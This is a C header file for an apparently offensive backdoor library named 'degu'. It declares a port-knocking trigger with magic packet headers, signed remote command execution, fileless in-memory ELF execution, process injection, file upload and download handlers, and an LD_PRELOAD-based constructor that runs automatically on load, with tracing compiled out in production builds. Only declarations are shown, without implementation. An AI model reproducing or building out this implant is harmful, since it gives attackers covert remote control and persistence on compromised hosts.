#include "keys.h"

void trace(const char* format, ...);
void hexdump(const char* header, const void* data, size_t size);

#ifdef PROD
    #define TRACE   (void)sizeof
    #define HEXDUMP (void)sizeof
    #define DEGU_FUNC_EXPORT __attribute__ ((visibility ("default")))
    #define DEGU_FUNC_INIT   __attribute__((constructor))
#else
    #define TRACE( fmt , args... ) trace("\033[1;36m%-18s\033[0;33m%-18s\033[0;32m#%d  \t\033[0m" fmt , __FILE__ , __FUNCTION__ , __LINE__ , ##args );
    #define HEXDUMP( header, data , len ) hexdump( header, data , len ) 
    #define DEGU_FUNC_EXPORT __attribute__ ((visibility ("default")))
    #define DEGU_FUNC_INIT  __attribute__((constructor,visibility ("default")))
#endif

#define PKTLEN_TRIGG      0x00000400
#define STRIPUDP          42
#define LIB_BYPASS        "_LC" // flag to unload raw sock and alarm when used by python
#define PRELOAD           "LD_PRELOAD"
#define PORT              "PORT"
#define WAKE              2     // timer sigalarm
#define TIMEOUT           10    // timeout for network operations

#define DEGU_EXE_MEMFD   "<o):" // magic tiny degu header for memfd execution
#define DEGU_EXE_UL      "<o)~" // magic tiny degu header for ul execution
#define DEGU_UP          "Oo>>" // magic tiny degu header for upload
#define DEGU_DL          "Oo<<" // magic tiny degu header for download
#define DEGU_GHOST_MAX_CMD 1300 // max bytes for cmd

extern unsigned char bot_public_key[32];
extern unsigned char bot_private_key[64];
extern unsigned char knock_key[32];
extern unsigned char public_key[32];

//ulexec
int reflect_execv(unsigned char *elf, char **argv, size_t binsize);

//crypto
int verify_buffer(unsigned char *data,size_t len);
unsigned int xvrfy(const unsigned char* signature, const unsigned char* message, size_t message_len);
void xdata(uint8_t *key, unsigned char* data, ssize_t len);
void ed25519_getpub(unsigned char *public_key, unsigned char *private_key);
void ed25519_key_exchange(unsigned char *shared_secret, const unsigned char *public_key, const unsigned char *private_key);
void setup_keys(void);

//inject
int inject(int pid,char *dso);

// degu operations
int  knock(unsigned char* data,size_t len);
void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret);
void knock_handle_up(int sock,unsigned  char *header,unsigned char *secret);
void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret);
void knock_ghost_exe( unsigned char * cmd, size_t len );

// lib
DEGU_FUNC_EXPORT void xnock(unsigned char* data, ssize_t len);
DEGU_FUNC_EXPORT int  xbuf(unsigned char *destkey,unsigned char *privkey, unsigned char *data, size_t len);
DEGU_FUNC_EXPORT void xpub(unsigned char *destkey,unsigned char *privkey);
DEGU_FUNC_EXPORT void xsig(unsigned char* signature, const unsigned char* message, size_t message_len, const unsigned char* private_key);
DEGU_FUNC_EXPORT void keygen(char* path);

// start
DEGU_FUNC_INIT void degu(); // lib entry point
